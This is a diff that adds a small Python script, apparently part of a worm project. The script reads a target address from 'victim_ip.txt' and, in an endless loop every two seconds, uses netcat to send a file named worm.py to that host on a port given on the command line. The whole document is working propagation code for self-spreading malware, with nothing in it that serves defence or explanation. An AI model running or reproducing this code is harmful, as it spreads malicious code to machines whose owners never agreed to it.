@@ -1,0 +1,13 @@
+#!/usr/bin/env python3
+import sys
+import os
+import time
+
+port = sys.argv[1]
+f = open('victim_ip.txt','r')
+victim_ip = f.read().replace('\n','')
+f.close()
+while True:
+    print("sending worm to victim...")
+    os.system("cat worm.py | nc -w1 "+ victim_ip + " " + port)
+    time.sleep(2)
